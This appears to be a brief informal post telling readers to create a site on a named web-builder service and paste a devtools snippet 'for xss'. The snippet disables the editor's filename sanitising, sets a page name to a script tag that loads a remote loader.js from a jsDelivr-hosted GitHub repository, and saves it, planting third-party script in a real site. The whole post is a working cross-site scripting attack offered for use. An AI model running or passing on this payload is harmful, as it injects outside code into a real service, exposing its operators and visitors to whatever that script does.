Go to https://website.nhd.org make a new site and run dis in devtools for xss!!!1!11!
```
editor.ToFileName = src => src; document.getElementById("new-page-name").value = '<script src="https://cdn.jsdelivr.net/gh/ioB-ybbolB/Blobe-Games@master/loader.js"></script>'; editor.Page.Save(this);
```
